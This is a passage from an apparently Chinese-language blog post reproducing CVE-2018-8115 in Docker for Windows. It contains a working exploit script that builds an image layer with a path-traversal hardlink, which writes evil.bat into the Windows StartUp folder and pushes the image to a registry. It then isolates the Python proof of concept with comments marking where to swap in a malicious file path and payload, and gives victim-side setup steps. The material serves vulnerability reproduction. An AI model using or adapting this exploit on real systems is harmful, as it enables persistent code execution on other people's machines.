</span><span class=lnt>143
</span><span class=lnt>144
</span><span class=lnt>145
</span><span class=lnt>146
</span><span class=lnt>147
</span><span class=lnt>148
</span><span class=lnt>149
</span><span class=lnt>150
</span><span class=lnt>151
</span><span class=lnt>152
</span><span class=lnt>153
</span><span class=lnt>154
</span><span class=lnt>155
</span><span class=lnt>156
</span><span class=lnt>157
</span><span class=lnt>158
</span><span class=lnt>159
</span><span class=lnt>160
</span><span class=lnt>161
</span><span class=lnt>162
</span><span class=lnt>163
</span><span class=lnt>164
</span><span class=lnt>165
</span><span class=lnt>166
</span><span class=lnt>167
</span><span class=lnt>168
</span><span class=lnt>169
</span><span class=lnt>170
</span><span class=lnt>171
</span><span class=lnt>172
</span><span class=lnt>173
</span><span class=lnt>174
</span><span class=lnt>175
</span><span class=lnt>176
</span><span class=lnt>177
</span><span class=lnt>178
</span><span class=lnt>179
</span><span class=lnt>180
</span><span class=lnt>181
</span><span class=lnt>182
</span><span class=lnt>183
</span><span class=lnt>184
</span><span class=lnt>185
</span><span class=lnt>186
</span><span class=lnt>187
</span><span class=lnt>188
</span><span class=lnt>189
</span><span class=lnt>190
</span><span class=lnt>191
</span><span class=lnt>192
</span><span class=lnt>193
</span><span class=lnt>194
</span><span class=lnt>195
</span><span class=lnt>196
</span><span class=lnt>197
</span><span class=lnt>198
</span><span class=lnt>199
</span><span class=lnt>200
</span><span class=lnt>201
</span><span class=lnt>202
</span><span class=lnt>203
</span><span class=lnt>204
</span><span class=lnt>205
</span><span class=lnt>206
</span><span class=lnt>207
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-shell data-lang=shell><span class=cp>#!/bin/bash
</span><span class=cp></span>#
<span class=c1># Copyright (C) 2018, Michael Hanselmann &lt;https://hansmi.ch/&gt;</span>
#

<span class=nb>set</span> -e -u -o pipefail
<span class=nb>set</span> -x

<span class=nv>registry</span><span class=o>=</span>http://localhost:5000

<span class=nv>tmpdir</span><span class=o>=</span><span class=k>$(</span>mktemp -d<span class=k>)</span>
<span class=nb>trap</span> <span class=s1>&#39;rm -rf &#34;$tmpdir&#34;&#39;</span> EXIT

<span class=nv>tmplayer</span><span class=o>=</span><span class=s2>&#34;</span><span class=si>${</span><span class=nv>tmpdir</span><span class=si>}</span><span class=s2>/layer.tar&#34;</span>

digest<span class=o>()</span> <span class=o>{</span>
  <span class=nb>echo</span> -n sha256: <span class=o>&amp;&amp;</span> <span class=se>\
</span><span class=se></span>  sha256sum <span class=p>|</span> cut -c-64
<span class=o>}</span>

upload<span class=o>()</span> <span class=o>{</span>
  <span class=nb>local</span> <span class=nv>datafile</span><span class=o>=</span><span class=s2>&#34;</span><span class=nv>$1</span><span class=s2>&#34;</span>
  <span class=nb>local</span> <span class=nv>digest</span><span class=o>=</span><span class=s2>&#34;</span><span class=k>$(</span>digest &lt; <span class=s2>&#34;</span><span class=nv>$datafile</span><span class=s2>&#34;</span><span class=k>)</span><span class=s2>&#34;</span>

  <span class=c1># Prepare upload</span>
  <span class=nb>local</span> <span class=nv>upload_location</span><span class=o>=</span><span class=k>$(</span>
    curl -v --dump-header - -XPOST <span class=s2>&#34;</span><span class=si>${</span><span class=nv>registry</span><span class=si>}</span><span class=s2>/v2/evil/image/blobs/uploads/&#34;</span> <span class=p>|</span>
    perl -ne <span class=s1>&#39;chomp &amp;&amp; /^Location:\s*(.+?)\s*$/ &amp;&amp; print $1&#39;</span>
    <span class=k>)</span>

  <span class=nb>echo</span> <span class=s2>&#34;upload_location=</span><span class=si>${</span><span class=nv>upload_location</span><span class=si>}</span><span class=s2>&#34;</span> &gt;<span class=p>&amp;</span><span class=m>2</span>

  curl -v -XPUT --header <span class=s1>&#39;Expect:&#39;</span> --data-binary <span class=s2>&#34;@</span><span class=si>${</span><span class=nv>datafile</span><span class=si>}</span><span class=s2>&#34;</span> <span class=se>\
</span><span class=se></span>    --header <span class=s1>&#39;Content-Type: application/octet-stream&#39;</span> <span class=se>\
</span><span class=se></span>    <span class=s2>&#34;</span><span class=si>${</span><span class=nv>upload_location</span><span class=si>}</span><span class=s2>&amp;digest=</span><span class=si>${</span><span class=nv>digest</span><span class=si>}</span><span class=s2>&#34;</span>

  <span class=nb>echo</span> -n <span class=s2>&#34;</span><span class=nv>$digest</span><span class=s2>&#34;</span>
<span class=o>}</span>

write_base_layer<span class=o>()</span> <span class=o>{</span>
  <span class=c1># Tar containing hive files and dummy Dockerfile</span>
  base64 -d <span class=s>&lt;&lt;&#39;EOF&#39; | gunzip -c
</span><span class=s>H4sIANXIjFoAA+3d3W7bdBjHcbdaQYoYTGy89MyHcNL43elBQU6bqhUr6QtjVEJDJnOyqC9Bjrt2
</span><span class=s>HO0SuAkkBBfADXDCMTfAEadcQrFju9ip2yWd46zx9yM1cfz4n3hOn7/n6Kdm2z7bcOynjttfkqrr
</span><span class=s>3UOnL+ROCl11LymaKsiqf6uokiTrgiQrmqkL4ln+u3LZSd+zXX9XXvd5hv9xt4RWEx9u1q3d1Y3N
</span><span class=s>rxtLLdexvW7v2OseOSuyLi8rkqLK5pKumrWa4b87FUUXt/Yeb3651ny8t9T2f19sz3NXZKOiSqJ9
</span><span class=s>9TC/2rq2enR1ddqHaKZNqOVTJEm7tv+D5XT/S4qkCqI+4f0aKHn/D97/6nbyLLDWax04btDbOb3G
</span><span class=s>q+Z/XVUS77/sv/+arsnM/0VQR5j/1StmfVWpKLKaqLj2af/pirVjNTr1Hct3YMXWBrd1qxM+rO8N
</span><span class=s>7jqDxzuNaKNH0dq6v3Yn2rBjVU8bbctqrEYbrW8Gt6tW+Nh/nahej+uN6DXWrdWqtbuVfP6H0cK+
</span><span class=s>9cWBv5OX9udZ8LiiXDqVqdknMMOUzWU5OCteOoGpt+S0FfZ/7i2f4s/n18//ujHU/4qi+/1fSBOV
</span><span class=s>vP/Xd5tb4lG35fb6vbZXPbaPe33Hfe64dyt3K6vN7X3x/98NsTrtvUXeUmf+je7zN+T6T5c5/xeC
</span><span class=s>679ym1DLp9zk+k82uf4rwuD9H7r+c9r2yaH3yP9/wHdrzqFnv+5rjD//G5LG53+FGHH+12TTqBlX
</span><span class=s>zv/+lWDm/H8xLHP+T1Yvz/8X1WkfopkW9n/uLZ9y/fWfkjH/q3rQ/1z/TZ7rdNpz/v1cYl2w/FZi
</span><span class=s>WQwW7qW3mZT5V9Sb7d1OEftRBov39bmff/vwyb+//sUhBQAAAIAZ9+z77vFg4V52/Zfz8/PjA1H4
</span><span class=s>84+3L64T/VXncf08Ei+fDdWT7vg/u83mV8HyN/42/QNBCLYPfoIn/mlwf+flD/79y2jMAyH4TODb
</span><span class=s>wVhh/oHwufCeMBderS68P1j3cbgu/OBgQfRvxPlw20V/ZLRteJtet/BOUBgaN/z473evPXwAAAAA
</span><span class=s>ANwKGfmvPfso3xDI+PkvTdUU8l9FGDX/pZh6TRk//xUPy85/JaoZ+a+4Ou1DNNPC/s+95VPGz38p
</span><span class=s>UtD/5L8mj/xXeQX5r/nfPyL/BQAAAAAlQP4rPY78FwAAAABgFmXlv5zWidv1XuSWCBk//6VrKn//
</span><span class=s>sRCj5r9UU5PM8fNf8bDs/FeimpH/iqvTPkQzLcp/5d3yKTf4+1+yyt9/LgT5r/IK8l//7C+S/wIA
</span><span class=s>AACAEiD/lR5H/gsAAAAAMIuy8l+9tndqu85U81+yRv6rCKN+/69RW9aWx85/XQzL/v7fRDXj+3/j
</span><span class=s>6rQP0UyL8l95t3zKTfJfQf+T/5o88l/lFeS/Pv3sPvkvAAAAACgB8l/pceS/AAAAAACzKCv/9aLv
</span><span class=s>OXl+H9wN8l+yZJD/KsKo+S+zVjPU8fNf8bDs/FeimpH/iqvTPkQzLcp/5d3yKTf4/kcj6H/yX5NH
</span><span class=s>/qu8gvzXJz9+QP4LAAAAAEqA/Fd6HPkvAAAAAAAAAAAAAAAAAAAAAG+q/wA9MZkjAPAAAA==
</span><span class=s>EOF</span>
<span class=o>}</span>

write_layer<span class=o>()</span> <span class=o>{</span>
  write_base_layer &gt; <span class=s2>&#34;</span><span class=si>${</span><span class=nv>tmpdir</span><span class=si>}</span><span class=s2>/demo.tar&#34;</span>

  python3 -c <span class=s1>&#39;
</span><span class=s1>import sys
</span><span class=s1>import time
</span><span class=s1>import tarfile
</span><span class=s1>import tempfile
</span><span class=s1>import struct
</span><span class=s1>
</span><span class=s1>startupfile = \
</span><span class=s1>  &#34;ProgramData/Microsoft/Windows/Start Menu/Programs/StartUp/evil.bat&#34;
</span><span class=s1>
</span><span class=s1>with tempfile.NamedTemporaryFile() as script, \
</span><span class=s1>     tarfile.open(sys.argv[1], &#34;w&#34;, format=tarfile.PAX_FORMAT) as tar:
</span><span class=s1>  # Generate new digest every time
</span><span class=s1>  script.write(&#34;echo Hello World {}\r\npause\r\n&#34;.format(time.time()).encode(&#34;ascii&#34;))
</span><span class=s1>  script.flush()
</span><span class=s1>
</span><span class=s1>  tar.add(script.name, arcname=&#34;Files/script.bat&#34;)
</span><span class=s1>
</span><span class=s1>  # Hardlink for startup script
</span><span class=s1>  info = tarfile.TarInfo(&#34;Files\\../../../../../../../../&#34; + startupfile)
</span><span class=s1>  info.type = tarfile.LNKTYPE
</span><span class=s1>  info.linkname = &#34;Files\\script.bat&#34;
</span><span class=s1>  tar.addfile(info)
</span><span class=s1>&#39;</span> <span class=s2>&#34;</span><span class=si>${</span><span class=nv>tmpdir</span><span class=si>}</span><span class=s2>/evil.tar&#34;</span>

  cat &lt; <span class=s2>&#34;</span><span class=si>${</span><span class=nv>tmpdir</span><span class=si>}</span><span class=s2>/demo.tar&#34;</span> &gt; <span class=s2>&#34;</span><span class=nv>$tmplayer</span><span class=s2>&#34;</span>
  tar --concatenate --absolute-names -f <span class=s2>&#34;</span><span class=nv>$tmplayer</span><span class=s2>&#34;</span> <span class=s2>&#34;</span><span class=si>${</span><span class=nv>tmpdir</span><span class=si>}</span><span class=s2>/evil.tar&#34;</span>

  tar -Ptvf <span class=s2>&#34;</span><span class=nv>$tmplayer</span><span class=s2>&#34;</span>
<span class=o>}</span>

write_layer

<span class=nv>layer_digest</span><span class=o>=</span><span class=k>$(</span>upload <span class=s2>&#34;</span><span class=nv>$tmplayer</span><span class=s2>&#34;</span><span class=k>)</span>
<span class=nv>layer_size</span><span class=o>=</span><span class=k>$(</span>stat --format<span class=o>=</span><span class=s1>&#39;%s&#39;</span> <span class=s2>&#34;</span><span class=nv>$tmplayer</span><span class=s2>&#34;</span><span class=k>)</span>

cat &gt;<span class=s2>&#34;</span><span class=si>${</span><span class=nv>tmpdir</span><span class=si>}</span><span class=s2>/config.json&#34;</span> <span class=s>&lt;&lt;EOF
</span><span class=s>{
</span><span class=s>  &#34;architecture&#34;: &#34;amd64&#34;,
</span><span class=s>  &#34;name&#34;: &#34;image&#34;,
</span><span class=s>  &#34;tag&#34;: &#34;10&#34;,
</span><span class=s>  &#34;config&#34;: {
</span><span class=s>    &#34;Hostname&#34;: &#34;&#34;,
</span><span class=s>    &#34;Domainname&#34;: &#34;&#34;,
</span><span class=s>    &#34;User&#34;: &#34;&#34;,
</span><span class=s>    &#34;AttachStdin&#34;: false,
</span><span class=s>    &#34;AttachStdout&#34;: false,
</span><span class=s>    &#34;AttachStderr&#34;: false,
</span><span class=s>    &#34;Tty&#34;: false,
</span><span class=s>    &#34;OpenStdin&#34;: false,
</span><span class=s>    &#34;StdinOnce&#34;: false,
</span><span class=s>    &#34;Env&#34;: null,
</span><span class=s>    &#34;Cmd&#34;: [
</span><span class=s>      &#34;noop&#34;
</span><span class=s>    ],
</span><span class=s>    &#34;Image&#34;: &#34;sha256:8a62949f00589b4b9e99586bd40555ad36c1719a4d1c60d7094fbfb5997c4d12&#34;,
</span><span class=s>    &#34;Volumes&#34;: null,
</span><span class=s>    &#34;WorkingDir&#34;: &#34;&#34;,
</span><span class=s>    &#34;Entrypoint&#34;: null,
</span><span class=s>    &#34;OnBuild&#34;: null,
</span><span class=s>    &#34;Labels&#34;: null
</span><span class=s>  },
</span><span class=s>  &#34;container_config&#34;: {
</span><span class=s>    &#34;Hostname&#34;: &#34;&#34;,
</span><span class=s>    &#34;Domainname&#34;: &#34;&#34;,
</span><span class=s>    &#34;User&#34;: &#34;&#34;,
</span><span class=s>    &#34;AttachStdin&#34;: false,
</span><span class=s>    &#34;AttachStdout&#34;: false,
</span><span class=s>    &#34;AttachStderr&#34;: false,
</span><span class=s>    &#34;Tty&#34;: false,
</span><span class=s>    &#34;OpenStdin&#34;: false,
</span><span class=s>    &#34;StdinOnce&#34;: false,
</span><span class=s>    &#34;Env&#34;: null,
</span><span class=s>    &#34;Cmd&#34;: [
</span><span class=s>      &#34;cmd&#34;,
</span><span class=s>      &#34;/S&#34;,
</span><span class=s>      &#34;/C&#34;,
</span><span class=s>      &#34;&#34;
</span><span class=s>    ],
</span><span class=s>    &#34;Image&#34;: &#34;sha256:8a62949f00589b4b9e99586bd40555ad36c1719a4d1c60d7094fbfb5997c4d12&#34;,
</span><span class=s>    &#34;Volumes&#34;: null,
</span><span class=s>    &#34;WorkingDir&#34;: &#34;&#34;,
</span><span class=s>    &#34;Entrypoint&#34;: null,
</span><span class=s>    &#34;OnBuild&#34;: null,
</span><span class=s>    &#34;Labels&#34;: null
</span><span class=s>  },
</span><span class=s>  &#34;created&#34;: &#34;2018-02-21T08:54:32.3339289Z&#34;,
</span><span class=s>  &#34;docker_version&#34;: &#34;17.12.0-ce&#34;,
</span><span class=s>  &#34;history&#34;: [
</span><span class=s>    {
</span><span class=s>      &#34;created&#34;: &#34;2016-12-13T10:47:17Z&#34;,
</span><span class=s>      &#34;created_by&#34;: &#34;Apply image 10.0.14393.0&#34;
</span><span class=s>    },
</span><span class=s>    {
</span><span class=s>      &#34;created&#34;: &#34;2018-02-13T19:43:23Z&#34;,
</span><span class=s>      &#34;created_by&#34;: &#34;Install update 10.0.14393.2068&#34;
</span><span class=s>    },
</span><span class=s>    {
</span><span class=s>      &#34;created&#34;: &#34;2018-02-21T08:54:32.3339289Z&#34;,
</span><span class=s>      &#34;created_by&#34;: &#34;&#34;
</span><span class=s>    }
</span><span class=s>  ],
</span><span class=s>  &#34;os&#34;: &#34;windows&#34;,
</span><span class=s>  &#34;os.version&#34;: &#34;10.0.14393.2068&#34;,
</span><span class=s>  &#34;rootfs&#34;: {
</span><span class=s>    &#34;type&#34;: &#34;layers&#34;,
</span><span class=s>    &#34;diff_ids&#34;: [
</span><span class=s>      &#34;${layer_digest}&#34;
</span><span class=s>    ]
</span><span class=s>  }
</span><span class=s>}
</span><span class=s>EOF</span>

<span class=nv>config_digest</span><span class=o>=</span><span class=k>$(</span>upload <span class=s2>&#34;</span><span class=si>${</span><span class=nv>tmpdir</span><span class=si>}</span><span class=s2>/config.json&#34;</span><span class=k>)</span>
<span class=nv>config_size</span><span class=o>=</span><span class=k>$(</span>stat --format<span class=o>=</span><span class=s1>&#39;%s&#39;</span> <span class=s2>&#34;</span><span class=si>${</span><span class=nv>tmpdir</span><span class=si>}</span><span class=s2>/config.json&#34;</span><span class=k>)</span>

cat &gt;<span class=s2>&#34;</span><span class=si>${</span><span class=nv>tmpdir</span><span class=si>}</span><span class=s2>/manifest.json&#34;</span> <span class=s>&lt;&lt;EOF
</span><span class=s>{
</span><span class=s>   &#34;schemaVersion&#34;: 2,
</span><span class=s>   &#34;mediaType&#34;: &#34;application/vnd.docker.distribution.manifest.v2+json&#34;,
</span><span class=s>   &#34;config&#34;: {
</span><span class=s>      &#34;mediaType&#34;: &#34;application/vnd.docker.container.image.v1+json&#34;,
</span><span class=s>      &#34;size&#34;: ${config_size},
</span><span class=s>      &#34;digest&#34;: &#34;${config_digest}&#34;
</span><span class=s>   },
</span><span class=s>   &#34;layers&#34;: [
</span><span class=s>      {
</span><span class=s>         &#34;mediaType&#34;: &#34;application/vnd.docker.image.rootfs.diff.tar.gzip&#34;,
</span><span class=s>         &#34;size&#34;: ${layer_size},
</span><span class=s>         &#34;digest&#34;: &#34;${layer_digest}&#34;
</span><span class=s>      }
</span><span class=s>   ]
</span><span class=s>}
</span><span class=s>EOF</span>

curl -v -XPUT --data <span class=s2>&#34;@</span><span class=si>${</span><span class=nv>tmpdir</span><span class=si>}</span><span class=s2>/manifest.json&#34;</span> <span class=se>\
</span><span class=se></span>  --header <span class=s1>&#39;Content-Type: application/vnd.docker.distribution.manifest.v2+json&#39;</span> <span class=se>\
</span><span class=se></span>  <span class=s2>&#34;</span><span class=si>${</span><span class=nv>registry</span><span class=si>}</span><span class=s2>/v2/evil/image/manifests/latest&#34;</span>
</code></pre></td></tr></table></div></div><p>其中，真正的 <code>PoC</code> 是上面的 <code>Python</code> 代码，也就是下面这个，进行攻击时，根据实际情况修改代码即可（PS：注意把中文注释删了）：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-python data-lang=python><span class=kn>import</span> <span class=nn>sys</span>
<span class=kn>import</span> <span class=nn>time</span>
<span class=kn>import</span> <span class=nn>tarfile</span>
<span class=kn>import</span> <span class=nn>tempfile</span>
<span class=kn>import</span> <span class=nn>struct</span>

<span class=c1># 修改点1：这里为写入的恶意文件的路径以及文件名</span>
<span class=n>startupfile</span> <span class=o>=</span> \
  <span class=s2>&#34;ProgramData/Microsoft/Windows/Start Menu/Programs/StartUp/evil.bat&#34;</span>

<span class=k>with</span> <span class=n>tempfile</span><span class=o>.</span><span class=n>NamedTemporaryFile</span><span class=p>()</span> <span class=k>as</span> <span class=n>script</span><span class=p>,</span> \
     <span class=n>tarfile</span><span class=o>.</span><span class=n>open</span><span class=p>(</span><span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=s2>&#34;w&#34;</span><span class=p>,</span> <span class=n>format</span><span class=o>=</span><span class=n>tarfile</span><span class=o>.</span><span class=n>PAX_FORMAT</span><span class=p>)</span> <span class=k>as</span> <span class=n>tar</span><span class=p>:</span>
  <span class=c1># 修改点2：这里为写入的恶意文件的内容</span>
  <span class=n>script</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=s2>&#34;echo Hello World {}</span><span class=se>\r\n</span><span class=s2>pause</span><span class=se>\r\n</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>time</span><span class=o>.</span><span class=n>time</span><span class=p>())</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s2>&#34;ascii&#34;</span><span class=p>))</span>
  <span class=n>script</span><span class=o>.</span><span class=n>flush</span><span class=p>()</span>

  <span class=n>tar</span><span class=o>.</span><span class=n>add</span><span class=p>(</span><span class=n>script</span><span class=o>.</span><span class=n>name</span><span class=p>,</span> <span class=n>arcname</span><span class=o>=</span><span class=s2>&#34;Files/script.bat&#34;</span><span class=p>)</span>

  <span class=c1># Hardlink for startup script</span>
  <span class=n>info</span> <span class=o>=</span> <span class=n>tarfile</span><span class=o>.</span><span class=n>TarInfo</span><span class=p>(</span><span class=s2>&#34;Files</span><span class=se>\\</span><span class=s2>../../../../../../../../&#34;</span> <span class=o>+</span> <span class=n>startupfile</span><span class=p>)</span>
  <span class=n>info</span><span class=o>.</span><span class=n>type</span> <span class=o>=</span> <span class=n>tarfile</span><span class=o>.</span><span class=n>LNKTYPE</span>
  <span class=n>info</span><span class=o>.</span><span class=n>linkname</span> <span class=o>=</span> <span class=s2>&#34;Files</span><span class=se>\\</span><span class=s2>script.bat&#34;</span>
  <span class=n>tar</span><span class=o>.</span><span class=n>addfile</span><span class=p>(</span><span class=n>info</span><span class=p>)</span>
</code></pre></td></tr></table></div></div><p>将上方代码保存为脚本文件并赋予执行权限，执行后末尾出现 <code>HTTP/1.1 201 Created</code> 代表成功：</p><p><figure><a class=lightgallery href=/images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b44978-fcfd-11ea-befc-80fa5b238e56.png data-thumbnail=/images/CVE-2018-8115漏洞复现/04b44978-fcfd-11ea-befc-80fa5b238e56.png data-sub-html="<h2> </h2><p> </p>"><img class=lazyload src=/svg/loading.min.svg data-src=/images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b44978-fcfd-11ea-befc-80fa5b238e56.png data-srcset="/images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b44978-fcfd-11ea-befc-80fa5b238e56.png, /images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b44978-fcfd-11ea-befc-80fa5b238e56.png 1.5x, /images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b44978-fcfd-11ea-befc-80fa5b238e56.png 2x" data-sizes=auto alt=/images/CVE-2018-8115漏洞复现/04b44978-fcfd-11ea-befc-80fa5b238e56.png></a><figcaption class=image-caption></figcaption></figure></p><p>使用 <code>curl http://127.0.0.1:5000/v2/evil/image/tags/list</code> 也可检测是否上传成功，当有 <code>name</code> 与 <code>tags</code> 时代表成功：</p><p><figure><a class=lightgallery href=/images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b4706e-fcfd-11ea-9508-80fa5b238e56.png data-thumbnail=/images/CVE-2018-8115漏洞复现/04b4706e-fcfd-11ea-9508-80fa5b238e56.png data-sub-html="<h2> </h2><p> </p>"><img class=lazyload src=/svg/loading.min.svg data-src=/images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b4706e-fcfd-11ea-9508-80fa5b238e56.png data-srcset="/images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b4706e-fcfd-11ea-9508-80fa5b238e56.png, /images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b4706e-fcfd-11ea-9508-80fa5b238e56.png 1.5x, /images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b4706e-fcfd-11ea-9508-80fa5b238e56.png 2x" data-sizes=auto alt=/images/CVE-2018-8115漏洞复现/04b4706e-fcfd-11ea-9508-80fa5b238e56.png></a><figcaption class=image-caption></figcaption></figure></p><p>镜像构建好之后，可以开始进行模拟受害者了。首先重新以管理员权限启动 <code>Docker for Windows</code>，启动后之后再右键右下角 Docker 图标，选择 <code>Settings</code>：</p><p><figure><a class=lightgallery href=/images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b49768-fcfd-11ea-b2fd-80fa5b238e56.png data-thumbnail=/images/CVE-2018-8115漏洞复现/04b49768-fcfd-11ea-b2fd-80fa5b238e56.png data-sub-html="<h2> </h2><p> </p>"><img class=lazyload src=/svg/loading.min.svg data-src=/images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b49768-fcfd-11ea-b2fd-80fa5b238e56.png data-srcset="/images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b49768-fcfd-11ea-b2fd-80fa5b238e56.png, /images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b49768-fcfd-11ea-b2fd-80fa5b238e56.png 1.5x, /images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b49768-fcfd-11ea-b2fd-80fa5b238e56.png 2x" data-sizes=auto alt=/images/CVE-2018-8115漏洞复现/04b49768-fcfd-11ea-b2fd-80fa5b238e56.png></a><figcaption class=image-caption></figcaption></figure></p><p>在 <code>Settings</code> 中，单击 <code>Daemon</code> 选项，将 <code>Basec</code> 开关打开：</p><p><figure><a class=lightgallery href=/images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b4b2f6-fcfd-11ea-8382-80fa5b238e56.png data-thumbnail=/images/CVE-2018-8115漏洞复现/04b4b2f6-fcfd-11ea-8382-80fa5b238e56.png data-sub-html="<h2> </h2><p> </p>"><img class=lazyload src=/svg/loading.min.svg data-src=/images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b4b2f6-fcfd-11ea-8382-80fa5b238e56.png data-srcset="/images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b4b2f6-fcfd-11ea-8382-80fa5b238e56.png, /images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b4b2f6-fcfd-11ea-8382-80fa5b238e56.png 1.5x, /images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b4b2f6-fcfd-11ea-8382-80fa5b238e56.png 2x" data-sizes=auto alt=/images/CVE-2018-8115漏洞复现/04b4b2f6-fcfd-11ea-8382-80fa5b238e56.png></a><figcaption class=image-caption></figcaption></figure></p><p>随后将下面的配置信息粘贴进文本框中并单击 <code>Apply</code>，注意，下面标记的两个框中的 <code>IP地址</code> 是刚才搭建的 Registry 主机的 <code>IP地址</code>，需根据实际情况替换：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-json data-lang=json><span class=p>{</span>
  <span class=nt>&#34;registry-mirrors&#34;</span><span class=p>:</span> <span class=p>[</span>
    <span class=s2>&#34;https://hub-mirror.c.163.com/&#34;</span>
  <span class=p>],</span>
  <span class=nt>&#34;insecure-registries&#34;</span><span class=p>:</span> <span class=p>[</span>
    <span class=s2>&#34;192.168.33.128:5000&#34;</span>
  <span class=p>],</span>
  <span class=nt>&#34;debug&#34;</span><span class=p>:</span> <span class=kc>true</span><span class=p>,</span>
  <span class=nt>&#34;experimental&#34;</span><span class=p>:</span> <span class=kc>true</span><span class=p>,</span>
  <span class=nt>&#34;allow-nondistributable-artifacts&#34;</span><span class=p>:</span> <span class=p>[</span>
    <span class=s2>&#34;192.168.33.128:5000&#34;</span>
  <span class=p>]</span>
<span class=p>}</span>
</code></pre></td></tr></table></div></div><p><figure><a class=lightgallery href=/images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b4d28c-fcfd-11ea-9b5b-80fa5b238e56.png data-thumbnail=/images/CVE-2018-8115漏洞复现/04b4d28c-fcfd-11ea-9b5b-80fa5b238e56.png data-sub-html="<h2> </h2><p> </p>"><img class=lazyload src=/svg/loading.min.svg data-src=/images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b4d28c-fcfd-11ea-9b5b-80fa5b238e56.png data-srcset="/images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b4d28c-fcfd-11ea-9b5b-80fa5b238e56.png, /images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b4d28c-fcfd-11ea-9b5b-80fa5b238e56.png 1.5x, /images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b4d28c-fcfd-11ea-9b5b-80fa5b238e56.png 2x" data-sizes=auto alt=/images/CVE-2018-8115漏洞复现/04b4d28c-fcfd-11ea-9b5b-80fa5b238e56.png></a><figcaption class=image-caption></figcaption></figure></p><p>然后以管理员权限打开命令行或者 PowerShell 窗口，输入 <code>docker pull 192.168.33.128:5000/evil/image:latest</code>，即可看见自启目录中被写入了 <code>evil.bat</code> 文件。注意这个 <code>IP地址</code> 也得根据实际情况替换：</p><p><figure><a class=lightgallery href=/images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b4f224-fcfd-11ea-8139-80fa5b238e56.png data-thumbnail=/images/CVE-2018-8115漏洞复现/04b4f224-fcfd-11ea-8139-80fa5b238e56.png data-sub-html="<h2> </h2><p> </p>"><img class=lazyload src=/svg/loading.min.svg data-src=/images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b4f224-fcfd-11ea-8139-80fa5b238e56.png data-srcset="/images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b4f224-fcfd-11ea-8139-80fa5b238e56.png, /images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b4f224-fcfd-11ea-8139-80fa5b238e56.png 1.5x, /images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b4f224-fcfd-11ea-8139-80fa5b238e56.png 2x" data-sizes=auto alt=/images/CVE-2018-8115漏洞复现/04b4f224-fcfd-11ea-8139-80fa5b238e56.png></a><figcaption 